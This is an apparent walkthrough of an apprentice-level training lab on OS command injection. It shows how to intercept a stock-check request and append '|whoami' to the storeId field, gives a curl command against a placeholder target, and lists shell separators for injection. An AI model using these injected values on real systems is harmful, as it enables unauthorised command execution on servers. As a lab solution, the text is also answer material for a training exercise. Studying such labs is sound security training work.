# OS command injection, simple case — Apprentice

**Status:** Solved

---

## Goal

Execute the `whoami` command on the server through command injection vulnerability.

---

## Steps (simple & complete)

1. **Find the vulnerable feature**
   - Go to any product page
   - Click "Check stock" button
   - This feature interacts with the system

2. **Intercept the request**
   - Use Burp Suite to catch the request
   - You'll see something like:
```
   POST /product/stock
   productId=1&storeId=1
```

3. **Test for command injection**
   - Try injecting a command with pipe:
```
   storeId=1|whoami
```
   - The application might execute both commands

4. **Execute the attack**
```bash
   curl -X POST "https://TARGET/product/stock" \
     -d "productId=1&storeId=1|whoami"
```

5. **Check response**
   - Look for username in response like:
```
   258 units
   peter-webapp
```
   - Thats the server username!

6. **Lab solved**
   - Once `whoami` output appears, your done

---

## Example

**Normal request:**
```
storeId=1
Response: 258 units
```

**Injected request:**
```
storeId=1|whoami
Response: 
258 units
peter-webapp
```

---

## Common command seperators

Try these if one doesnt work:
- `|` - Pipe operator
- `;` - Semicolon
- `&` - Ampersand (may need encoding as `%26`)
- `%0a` - Newline (URL encoded)

---

## Why it works

The app runs something like:
```bash
stockreader.sh 1
```

When you inject `1|whoami`, it becomes:
```bash
stockreader.sh 1|whoami
```

The shell executes both commands and you get both outputs!

---

